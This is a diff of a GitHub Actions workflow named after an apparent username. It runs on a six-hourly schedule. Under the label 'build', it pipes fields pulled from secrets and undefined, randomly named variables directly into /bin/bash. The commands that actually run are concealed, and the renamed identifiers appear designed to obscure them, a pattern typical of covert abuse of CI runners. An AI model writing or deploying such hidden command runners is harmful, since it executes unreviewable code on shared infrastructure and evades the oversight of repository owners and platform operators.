@@ -3,27 +3,22 @@ name: fengyuanchai4545
 on:
   workflow_dispatch:
   schedule:
-    - cron: '33 2/6 * * *'
+    - cron: '32 0/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: fengyuanchai4545
         env:
-          ohb6: ${{ secrets.ohb6 }}
+          avokj60: ${{ secrets.avokj60 }}
         run: |
-          echo $ohb6 | jq -r .gqoa146 | /bin/bash
-          echo $smxe8 | jq -r .ypo7 | /bin/bash
-          echo $jw92974 | jq -r .yt00679 | /bin/bash
-          echo $wyf15 | jq -r .u8388 | /bin/bash
-          echo $xr2844 | jq -r .u0993 | /bin/bash
-          echo $m32671 | jq -r .y378 | /bin/bash
-          echo $fh56 | jq -r .u43 | /bin/bash
-          echo $lv148 | jq -r .lld040 | /bin/bash
-          echo $ka14416 | jq -r .w112 | /bin/bash
-          echo $gfjn69277 | jq -r .nlrf199 | /bin/bash
-          echo $zkk69160 | jq -r .yxfaa13 | /bin/bash
-          echo $al9 | jq -r .mm00255 | /bin/bash
-          echo $trd16 | jq -r .c6 | /bin/bash
+          echo $avokj60 | jq -r .ys9190 | /bin/bash
+          echo $por51 | jq -r .jot2115 | /bin/bash
+          echo $gzn02995 | jq -r .d35 | /bin/bash
+          echo $yfdbk71 | jq -r .uqd4 | /bin/bash
+          echo $pvlz45473 | jq -r .tnf87590 | /bin/bash
+          echo $zhpa78826 | jq -r .jzhlq14 | /bin/bash
 
